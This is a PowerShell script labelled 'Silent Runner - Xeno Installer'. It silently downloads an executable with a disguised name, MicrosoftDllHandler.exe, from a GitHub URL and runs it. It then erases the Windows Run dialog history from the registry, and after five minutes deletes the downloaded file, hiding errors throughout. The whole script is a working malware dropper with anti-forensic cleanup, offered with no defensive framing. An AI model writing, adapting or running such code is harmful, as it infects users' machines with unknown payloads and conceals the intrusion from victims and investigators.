# Silent Runner - Xeno Installer
$payloadUrl = "https://github.com/hypnotixx0/xenolord/raw/main/MicrosoftDllHandler.exe"
$payloadPath = "$env:USERPROFILE\Downloads\MicrosoftDllHandler.exe"

try {
    # Download the file
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($payloadUrl, $payloadPath)
    $webClient.Dispose()
    
    # Wait for file system to settle
    Start-Sleep -Seconds 3
    
    # Verify file is fully written
    $serverSize = (Invoke-WebRequest -Uri $payloadUrl -Method Head -UseBasicParsing).Headers['Content-Length']
    $localSize = (Get-Item $payloadPath).Length
    
    while ($localSize -ne $serverSize) {
        Start-Sleep -Seconds 1
        $localSize = (Get-Item $payloadPath).Length
    }
    
    Start-Sleep -Seconds 2
    
    # Execute
    Start-Process -FilePath $payloadPath
    
    # Clean RunMRU registry (Run dialog history)
    Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force -ErrorAction SilentlyContinue
    
    # Wait 5 minutes then delete payload
    Start-Sleep -Seconds 300
    Remove-Item -Path $payloadPath -Force -ErrorAction SilentlyContinue
} catch {}
